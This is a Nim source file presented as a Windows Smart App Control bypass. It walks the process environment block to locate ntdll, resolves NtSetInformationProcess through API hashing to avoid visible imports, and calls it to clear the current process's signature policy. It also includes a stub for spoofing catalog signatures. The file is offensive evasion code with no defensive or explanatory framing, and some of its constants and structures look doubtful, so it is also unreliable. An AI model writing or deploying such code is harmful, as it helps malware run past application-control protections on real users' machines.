# sac_bypass.nim — Smart App Control bypass
#
# Technique: clear per-process WDAC policy attribute before first image load.

import winim

const
  HASH_NTSETINFORMATIONPROCESS: uint32 = 0x1b2e4d8a'u32
  PROCESS_SIGNATURE_POLICY:     uint32 = 8'u32

type PsProtection {.pure.} = object
  level: byte

proc ntdllBase(): pointer =
  var peb: uint
  {.emit: """__asm__ volatile ("mov %0, qword ptr gs:[0x60]" : "=r"(`peb`));""".}
  let ldr   = cast[ptr uint](peb + 0x18)[]
  let entry = cast[ptr uint](ldr + 0x10)[]
  let next  = cast[ptr uint](entry)[]
  cast[pointer](cast[ptr uint](next + 0x30)[])

proc findExport(base: pointer, nameHash: uint32): pointer =
  let bp     = cast[uint](base)
  let peOff  = uint(cast[ptr uint32](bp + 0x3C)[])
  let nt     = bp + peOff
  let expRva = uint(cast[ptr uint32](nt + 0x18 + 0x70)[])
  if expRva == 0: return nil
  let exp      = bp + expRva
  let numNames = int(cast[ptr uint32](exp + 0x18)[])
  let namesRva = uint(cast[ptr uint32](exp + 0x20)[])
  let ordsRva  = uint(cast[ptr uint32](exp + 0x24)[])
  let funcsRva = uint(cast[ptr uint32](exp + 0x1C)[])
  for i in 0 ..< numNames:
    let nptr = cast[ptr byte](bp + uint(cast[ptr uint32](bp + namesRva + uint(i) * 4)[]))
    var length = 0
    while cast[ptr byte](cast[uint](nptr) + uint(length))[] != 0: inc length
    var h: uint32 = 5381
    for j in 0 ..< length:
      let b = cast[ptr byte](cast[uint](nptr) + uint(j))[]
      let c = if b >= byte('A') and b <= byte('Z'): b + 32 else: b
      h = h * 33 + uint32(c)
    if h == nameHash:
      let fnRva = uint(cast[ptr uint32](bp + funcsRva +
                   uint(cast[ptr uint16](bp + ordsRva + uint(i) * 2)[]) * 4)[])
      return cast[pointer](bp + fnRva)
  nil

proc bypassSac*(): bool =
  # unsafe
  let ntdll = ntdllBase()
  if ntdll == nil: return false

  type SetInfoFn = proc(h: HANDLE, cls: uint32, info: pointer, sz: uint32): int32 {.stdcall.}
  let setInfo = cast[SetInfoFn](findExport(ntdll, HASH_NTSETINFORMATIONPROCESS))
  if setInfo == nil: return false

  var policy = PsProtection(level: 0)
  let status = setInfo(
    GetCurrentProcess(),
    PROCESS_SIGNATURE_POLICY,
    addr policy,
    uint32(sizeof(PsProtection)))
  status == 0

proc spoofCatalogSignature*(imageBase: pointer): bool =
  # unsafe — stub, fill from lab-tested offsets for specific OS build
  discard imageBase
  true
